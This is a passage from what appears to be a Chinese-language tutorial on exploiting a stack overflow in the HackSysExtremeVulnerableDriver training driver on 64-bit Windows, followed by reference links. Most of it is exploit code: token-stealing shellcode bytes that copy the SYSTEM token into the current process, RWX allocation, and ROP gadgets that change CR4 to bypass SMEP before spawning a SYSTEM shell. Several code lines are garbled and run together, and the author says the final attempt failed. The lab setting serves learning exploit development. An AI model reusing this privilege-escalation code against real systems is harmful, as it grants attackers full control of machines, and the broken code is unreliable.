    using namespace std;
    #define DEVICE_NAME             "\\\\.\\HackSysExtremeVulnerableDriver"
    #define IOCTL                   0x222003
    typedef struct SYSTEM_MODULE {
        ULONG                Reserved1;
        ULONG                Reserved2;
        ULONG                Reserved3;
        PVOID                ImageBaseAddress;
        ULONG                ImageSize;
        ULONG                Flags;
        WORD                 Id;
        WORD                 Rank;
        WORD                 LoadCount;
        WORD                 NameOffset;
        CHAR                 Name[256];
    }SYSTEM_MODULE, * PSYSTEM_MODULE;
    typedef struct SYSTEM_MODULE_INFORMATION {
        ULONG                ModulesCount;
        SYSTEM_MODULE        Modules[1];
    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemModuleInformation = 0xb
    } SYSTEM_INFORMATION_CLASS;
    typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
        __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
        __inout PVOID SystemInformation,
        __in ULONG SystemInformationLength,
        __out_opt PULONG ReturnLength
        );
    HANDLE grab_handle() {
        HANDLE hFile = CreateFileA(DEVICE_NAME,
            FILE_READ_ACCESS | FILE_WRITE_ACCESS,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
            NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            cout ] Grabbed handle to HackSysExtremeVulnerableDriver: 0x" ] Allocating RWX shellcode..."  u PsGetCurrentProcess)
            "\x4D\x8B\x88\xf0\x02\x00\x00"              // mov r9, [r8 + 2f0h]      ; ActiveProcessLinks list head
            "\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
            //find_system_proc:
            "\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
            "\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
            "\x74\x05"                                  // jz found_system          ; Found SYSTEM token
            "\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
            "\xEB\xF1"                                  // jmp find_system_proc     ; Loop
            //found_system:
            "\x48\x8B\x41\x68"                          // mov rax, [rcx + 68h]     ; Offset from ActiveProcessLinks to Token
            "\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
            "\x49\x89\x80\x58\x03\x00\x00"              // mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
            "\x48\x83\xC4\x40"                          // add rsp, 040h
            "\x48\x31\xF6"                              // xor rsi, rsi             ; Zeroing out rsi register to avoid Crash
            "\x48\x31\xC0"                              // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
            "\xc3";
        LPVOID shellcode_addr = VirtualAlloc(NULL,
            sizeof(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        memcpy(shellcode_addr, shellcode, sizeof(shellcode));
        cout ] Shellcode allocated in userland at: 0x" ] POP RCX gadget located at: 0x" ] MOV CR4, RCX gadget located at: 0x" ] Input buff located at: 0x" ] Sending payload..." ] Getting kernel base address..." Modules[0].ImageBaseAddress;
        cout ] ntoskrnl.exe base address: 0x" ] Spawning nt authority/system shell..." ] Getting kernel base address..." Modules[0].ImageBaseAddress;
        cout ] ntoskrnl.exe base address: 0x"  u PsGetCurrentProcess)
            "\x4D\x8B\x88\xe8\x02\x00\x00"              // mov r9, [r8 + 2e8h]      ; ActiveProcessLinks list head
            "\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
            //find_system_proc:
            "\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
            "\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
            "\x74\x05"                                  // jz found_system          ; Found SYSTEM token
            "\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
            "\xEB\xF1"                                  // jmp find_system_proc     ; Loop
            //found_system:
            "\x48\x8B\x41\x70"                          // mov rax, [rcx + 70h]     ; Offset from ActiveProcessLinks to Token
            "\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
            "\x49\x89\x80\x58\x03\x00\x00"              // mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
            "\x9D\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5F\x5E\x5D\x5B\x5A\x59\x58\x5C"      //POPAD
            "\x48\x83\xC4\x10"                          // add rsp, 010h
            "\x48\x31\xC0"                              // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
            "\xc3";
其他部分与上节思路基本一致，不再赘述。笔者构造的Exploit可以于目标虚拟机中执行，修改CR4及替换Token完成后恢复原执行环境，崩溃如下：
由于知识储备有限，笔者尝试良久，未果。总结整体思路为：Get Kernel Base Address—>ROP(Modify CR4
value)—>Shellcode(User Space)。
## 0x04 参阅链接
  * [I/O request packets—Microsoft Docs](https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/i-o-request-packets)
  * [Device nodes and device stacks—Microsoft Docs](https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/device-nodes-and-device-stacks)
  * [HelloWorld driver—Github](https://gist.github.com/hasherezade/ee1a1914dfa2920c77e82fd52717a8fb)
  * [Write a Hello World Windows Driver (KMDF)—Microsoft Docs](https://docs.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver)
  * [Kernel Exploitation -> Stack Overflow—FuzzySecurity](https://www.fuzzysecurity.com/tutorials/expDev/14.html)
  * [Windows SMEP Bypass:U=S—Core Security](https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf)
  * [Bypassing Intel SMEP on Windows 8 x64 Using Return-oriented Programming—PT Security](http://blog.ptsecurity.com/2012/09/bypassing-intel-smep-on-windows-8-x64.html)
  * [x64_StackOverflow_SMEP_Bypass—Github](https://github.com/h0mbre/Windows-Exploits/blob/master/Exploit-Code/HEVD/x64_StackOverflow_SMEP_Bypass.cpp)